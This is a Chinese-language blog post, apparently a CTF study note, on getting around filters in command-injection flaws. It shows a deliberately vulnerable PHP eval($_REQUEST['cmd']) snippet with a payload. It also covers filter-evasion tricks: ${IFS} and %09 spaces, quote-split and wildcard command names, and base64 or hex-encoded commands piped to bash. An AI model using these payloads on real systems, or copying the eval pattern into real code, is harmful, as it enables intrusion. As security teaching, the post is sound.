{"title":"RCE中一些常见的绕过方法","slug":"[一些总结]RCE中一些常见的绕过方法","date":"+020223-09-11T12:08:50.000Z","updated":"2023-09-30T07:41:45.075Z","comments":true,"path":"api/articles/[一些总结]RCE中一些常见的绕过方法.json","photos":[],"link":"","excerpt":"相关知识网络上有太多人总结了，但还是想自己动动手写点东西加深加深印象，哈哈","covers":["C:\\Users\\rdj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230923112108751.png","C:\\Users\\rdj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230923112136791.png","C:\\Users\\rdj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230923151637781.png"],"content":"<p>相关知识网络上有太多人总结了，但还是想自己动动手写点东西加深加深印象，哈哈</p>\n<span id=\"more\"></span>\n\n<p><strong>命令执行漏洞前提条件：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.存在可调用执行系统命令的函数。</span><br><span class=\"line\">2.该函数参数可控。</span><br><span class=\"line\">3.对参数过滤不严格。</span><br></pre></td></tr></table></figure>\n\n<p><strong>一些常见可以执行命令的函数：</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.<span class=\"keyword\">eval</span>()<span class=\"comment\">//把一串字符串作为PHP代码执行</span></span><br><span class=\"line\"><span class=\"number\">2</span>.<span class=\"title function_ invoke__\">system</span>()/<span class=\"title function_ invoke__\">passthru</span>()/<span class=\"title function_ invoke__\">exec</span>()</span><br><span class=\"line\"><span class=\"number\">3</span>.<span class=\"title function_ invoke__\">call_user_func</span>()/<span class=\"title function_ invoke__\">call_user_func_array</span>() <span class=\"comment\">//回调函数</span></span><br><span class=\"line\"><span class=\"number\">4</span>.<span class=\"title function_ invoke__\">creat_function</span>()</span><br><span class=\"line\"><span class=\"number\">5</span>.shell_exec <span class=\"comment\">//注意这玩意儿没回显，不过可以通过把它传给某个文件或者echo的方法看执行结果，比如：</span></span><br><span class=\"line\">    <span class=\"variable\">$output</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"string\">&#x27;ls -l&#x27;</span>); <span class=\"comment\">// 执行ls -l命令并将输出保存到$output变量中</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$output</span>;</span><br><span class=\"line\">     /?cmd=ls -al / &gt; viper3.txt</span><br><span class=\"line\"><span class=\"number\">6</span>.还可以用反引号``和$()执行命令。</span><br><span class=\"line\"><span class=\"number\">7</span>.preg_match的/e模式漏洞。</span><br></pre></td></tr></table></figure>\n\n<p>最后那个&#x2F;e模式好像已经被弃用好久了。。举个栗子：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/(\\d+)/e&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$replacement</span> = <span class=\"string\">&#x27;&quot;$1&quot; + 1&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$string</span> = <span class=\"string\">&#x27;123&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$replacement</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$result</span>; <span class=\"comment\">// 输出124</span></span><br></pre></td></tr></table></figure>\n\n<p><code>/(\\d+)/e</code>模式匹配一个或多个数字，并使用<code>&quot;$1&quot; + 1</code>作为替换字符串。在替换过程中，<code>&quot;$1&quot;</code>被解析为匹配的数字，然后加1。因此，最终的替换结果是123 + 1，即124。</p>\n<p><strong>管道符(Windows)：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|\t\t直接执行后面的语句</span><br><span class=\"line\">||\t\t如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class=\"line\">&amp;\t\t前面和后面命令都要执行，无论前面真假</span><br><span class=\"line\">&amp;&amp;\t\t如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"C:\\Users\\rdj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230923112108751.png\" alt=\"image-20230923112108751\"></p>\n<p><img src=\"C:\\Users\\rdj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230923112136791.png\" alt=\"image-20230923112136791\"></p>\n<p><strong>管道符(Linux)：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|\t\t直接执行后面的语句</span><br><span class=\"line\">||\t\t如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class=\"line\">&amp;\t\t前面和后面命令都要执行，无论前面真假</span><br><span class=\"line\">&amp;&amp;\t\t如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br><span class=\"line\">;       前后命令都要执行，无论前面真假</span><br></pre></td></tr></table></figure>\n\n<p><strong>空格绕过(ls &#x2F;和cat等均需空格)：</strong></p>\n<p>1.${IFS}</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ ls$&#123;IFS&#125;/</span><br><span class=\"line\">bin   dev  home  lib64\tmnt  proc  run\t srv  tmp  var</span><br><span class=\"line\">boot  etc  lib\t media\topt  root  sbin  sys  usr</span><br></pre></td></tr></table></figure>\n\n<p>2.$IFS$9</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ ls$IFS$9/</span><br><span class=\"line\">bin   dev  home  lib64\tmnt  proc  run\t srv  tmp  var</span><br><span class=\"line\">boot  etc  lib\t media\topt  root  sbin  sys  usr</span><br></pre></td></tr></table></figure>\n\n<p>3.%09</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&quot;cmd&quot;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>payload:<code>/?cmd=system(&#39;ls%09/&#39;);</code></p>\n<p><img src=\"C:\\Users\\rdj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230923151637781.png\" alt=\"image-20230923151637781\"></p>\n<p>4.&lt;和&lt;&gt;重定向符号</p>\n<p>在Linux中，<code>&lt;</code>是用于重定向输入的符号，它将一个文件的内容作为命令的输入。<code>&lt;</code>符号后面跟着文件名，表示将该文件的内容作为命令的输入。</p>\n<p>例如，假设有一个名为input.txt的文件，包含了一些文本内容。可以使用<code>&lt;</code>符号将input.txt文件的内容作为命令的输入，如下所示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">command</span> &lt; input.txt</span><br></pre></td></tr></table></figure>\n\n<p>上述命令将会执行command命令，并将input.txt文件的内容作为command命令的输入。</p>\n<p>另外，<code>&gt;</code>符号用于重定向输出，它将命令的输出保存到一个文件中。如果文件不存在，则会创建该文件；如果文件已存在，则会覆盖原有内容。</p>\n<p>而<code>&gt;&gt;</code>符号则用于追加输出，它将命令的输出追加到一个文件的末尾，而不是覆盖原有内容。</p>\n<p>例如，假设有一个名为output.txt的文件，可以使用<code>&gt;</code>符号将命令的输出保存到output.txt文件中，如下所示：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command &gt; output.txt</span><br></pre></td></tr></table></figure>\n\n<p>上述命令将会执行command命令，并将其输出保存到output.txt文件中。</p>\n<p>而使用<code>&gt;&gt;</code>符号可以将命令的输出追加到output.txt文件的末尾，如下所示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">command</span> &gt;&gt; output.txt</span><br></pre></td></tr></table></figure>\n\n<p>上述命令将会执行command命令，并将其输出追加到output.txt文件的末尾。</p>\n<p>总结起来，<code>&lt;</code>用于重定向输入，<code>&gt;</code>用于重定向输出，<code>&gt;&gt;</code>用于追加输出。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ cat&lt;hello.txt</span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br><span class=\"line\">[viper3@localhost ~]$ cat&lt;&gt;hello.txt</span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br></pre></td></tr></table></figure>\n\n<p>注意这东西没法和ls配合使用。</p>\n<p>5.利用{}</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ &#123;cat,hello.txt&#125;</span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br><span class=\"line\">[viper3@localhost ~]$ &#123;ls,/&#125;</span><br><span class=\"line\">bin   dev  home  lib64\tmnt  proc  run\t srv  tmp  var</span><br><span class=\"line\">boot  etc  lib\t media\topt  root  sbin  sys  usr</span><br></pre></td></tr></table></figure>\n\n<p>大括号（{}）在这个命令中被用作命令行扩展。它会将大括号中的内容展开为多个参数，然后将这些参数传递给命令进行处理。</p>\n<p>6.SQL语句中可以利用&#x2F;**&#x2F;和()包裹字符串代替空格(这个就不算RCE里的绕过了，哈哈)</p>\n<p><strong>过滤关键字，比如cat,tac,ls之类的</strong></p>\n<p>替代：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more:一页一页的显示档案内容</span><br><span class=\"line\">less:与 more 类似</span><br><span class=\"line\">head:查看头几行</span><br><span class=\"line\">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class=\"line\">tail:查看尾几行</span><br><span class=\"line\">nl：显示的时候，顺便输出行号</span><br><span class=\"line\">od:以二进制的方式读取档案内容</span><br></pre></td></tr></table></figure>\n\n<p>利用某些转义符号：</p>\n<p><code>&#39;&#39;,&quot;&quot;,\\,$&#123;Z&#125;,$*,$@,$任意，$&#123;任意&#125;</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ l&#x27;&#x27;s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ l&quot;&quot;s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ l$&#123;Z&#125;s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ l/s</span><br><span class=\"line\">bash: l/s: 没有那个文件或目录</span><br><span class=\"line\">[viper3@localhost ~]$ l\\s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ l$*s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ l$@s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ l$9s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ l$&#123;k&#125;s</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br></pre></td></tr></table></figure>\n\n<p>拼接：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ a=hel;b=lo.txt;cat $a$b</span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br></pre></td></tr></table></figure>\n\n<p>使用反引号&#96;&#96;或$()绕过(比如和printf配合使用)：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ printf &quot;\\154\\163&quot;</span><br><span class=\"line\">ls</span><br><span class=\"line\">[viper3@localhost ~]$ `printf &quot;\\154\\163&quot;`</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ (printf &quot;\\154\\163&quot;)</span><br><span class=\"line\">ls[viper3@localhost ~]$ $(printf &quot;\\154\\163&quot;)</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br></pre></td></tr></table></figure>\n\n<p>printf “??????”这东西是输出???代表的ASCII码值，???代表八进制(也可以用\\x??十六进制)，$()这个符号是把括号里面的东西当命令执行,反引号同理。</p>\n<p>通配符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在Linux中，通配符是用来匹配文件名或路径的特殊字符。它们可以用于命令行中的文件搜索、文件操作和正则表达式等场景中。</span><br><span class=\"line\"></span><br><span class=\"line\">以下是常用的通配符：</span><br><span class=\"line\"></span><br><span class=\"line\">    *：匹配任意字符（包括空字符）的任意数量。</span><br><span class=\"line\">    ?：匹配单个任意字符。</span><br><span class=\"line\">    []：匹配方括号内的任意一个字符。</span><br><span class=\"line\">    [!] 或 [^]：匹配不在方括号内的任意一个字符。</span><br><span class=\"line\">    &#123;&#125;：用于指定多个选择项，以逗号分隔。</span><br><span class=\"line\">    ~：表示当前用户的主目录。</span><br><span class=\"line\"></span><br><span class=\"line\">举例来说，如果你想匹配所有以 .txt 结尾的文件，可以使用通配符 *.txt；如果你想匹配以 a 开头的三个字符的文件，可以使用通配符 a??。</span><br></pre></td></tr></table></figure>\n\n<p>举个栗子：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ cat he*</span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br><span class=\"line\">tom</span><br><span class=\"line\">jerry</span><br><span class=\"line\">chris</span><br><span class=\"line\">jack</span><br><span class=\"line\">[viper3@localhost ~]$ cat ?????.txt</span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br><span class=\"line\">*匹配任意数量，这东西可以和find查找命令结合起来:</span><br><span class=\"line\">find / -name &quot;fl*&quot;   /是根目录，搜索根目录下所有名字带fl的文件(fl开头，后面任意)</span><br><span class=\"line\">注意：这里的?和*都只能用于文件名，如果是命令(类似ls cat等)就不适用。</span><br><span class=\"line\">但是：</span><br><span class=\"line\">m0re师傅的文章里在开头加了个/???就可以把/?用于命令了：</span><br><span class=\"line\"></span><br><span class=\"line\">zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class=\"line\">you are good!</span><br><span class=\"line\">zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class=\"line\">you are good!</span><br><span class=\"line\">zxcv0221@kali:~/桌面$ /???/?at flag</span><br><span class=\"line\">you are good!</span><br><span class=\"line\">zxcv0221@kali:~/桌面$ /???/?at ????</span><br><span class=\"line\">you are good!</span><br><span class=\"line\">zxcv0221@kali:~/桌面$ /???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class=\"line\">you are good!</span><br></pre></td></tr></table></figure>\n\n<p><strong>编码绕过(应该把前面那个printf的放在这里的，可惜)：</strong></p>\n<p>base64:(这东西可以和前面的&#96;&#96;和$()配合使用)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d</span><br><span class=\"line\">cat hello.txt</span><br><span class=\"line\">[viper3@localhost ~]$ `echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d`</span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br><span class=\"line\"></span><br><span class=\"line\">Y2F0IGhlbGxvLnR4dA== 是cat hello.txt的base64</span><br></pre></td></tr></table></figure>\n\n\n\n<p>hex:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</span><br><span class=\"line\"></span><br><span class=\"line\">同上，仍能用``及$()替换最后管道符及bash</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>换行绕过(感觉这个没怎么用过)：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ ca\\</span><br><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">t \\</span></span><br><span class=\"line\"><span class=\"language-bash\">&gt; hello\\</span></span><br><span class=\"line\"><span class=\"language-bash\">&gt; .txt</span></span><br><span class=\"line\">hello world!</span><br><span class=\"line\">yes</span><br><span class=\"line\">no</span><br><span class=\"line\">why</span><br></pre></td></tr></table></figure>\n\n<p>\\表示换行，下一行是这行的延续。</p>\n<p>m0re师傅的文章中还有这么个东西：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;ca\\\\&quot;</span>&gt;shell   两个\\是为了转义后面的\\，以便将其作为普通字符写入文件。</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;t\\\\&quot;</span>&gt;&gt;shell</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot; fl\\\\&quot;</span>&gt;&gt;shell</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;ag&quot;</span>&gt;&gt;shell</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> shell</span></span><br><span class=\"line\">ca\\</span><br><span class=\"line\">t\\</span><br><span class=\"line\"> fl\\</span><br><span class=\"line\">ag</span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sh shell</span>  </span><br><span class=\"line\">you are good!</span><br><span class=\"line\"></span><br><span class=\"line\">sh shell是运行名为&quot;shell&quot;的脚本文件的意思。在Linux中，使用sh命令后跟脚本文件的名称可以运行该脚本。</span><br></pre></td></tr></table></figure>\n\n<p><strong>利用$PATH环境变量绕过：</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[viper3@localhost ~]$ echo $PATH</span><br><span class=\"line\">/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/viper3/.local/bin:/home/viper3/bin</span><br><span class=\"line\">[viper3@localhost ~]$ echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span><br><span class=\"line\">ls</span><br><span class=\"line\">[viper3@localhost ~]$ `echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`</span><br><span class=\"line\">crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面</span><br><span class=\"line\">hello.txt  runme2\t   公共\t\t     视频  文档  音乐</span><br><span class=\"line\">[viper3@localhost ~]$ `$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`</span><br><span class=\"line\">&quot;hello.txt&quot;:1: bad minute</span><br><span class=\"line\">errors in crontab file, can&#x27;t install.</span><br><span class=\"line\"></span><br><span class=\"line\">注意不要少了echo!</span><br></pre></td></tr></table></figure>\n\n\n\n<p>以上内容参考了这些师傅们的文章，感谢：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://blog.csdn.net/qq_53142368/article/details/116152477</span><br><span class=\"line\">https://zhuanlan.zhihu.com/p/391439312</span><br><span class=\"line\">https://blog.csdn.net/qq_45836474/article/details/107248010</span><br><span class=\"line\">https://blog.csdn.net/qq_51295677?type=blog</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]}